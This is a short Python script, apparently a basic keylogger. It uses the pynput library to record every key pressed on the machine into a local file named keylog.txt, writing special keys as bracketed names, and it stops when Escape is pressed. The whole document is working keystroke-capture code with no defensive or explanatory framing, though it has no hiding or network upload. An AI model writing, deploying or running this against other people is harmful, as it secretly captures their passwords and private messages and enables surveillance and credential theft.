from pynput.keyboard import Key, Listener

# File where keystrokes will be saved
log_file = "keylog.txt"

def on_press(key):
    # Convert the key press to a string and write it to the log file
    with open(log_file, "a") as file:
        if hasattr(key, 'char'):
            file.write(key.char)
        elif key == Key.space:
            file.write(' ')
        elif key == Key.enter:
            file.write('\n')
        else:
            file.write(f'[{key}]')

def on_release(key):
    # Stop listener if escape key is pressed
    if key == Key.esc:
        return False

# Start the key listener
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
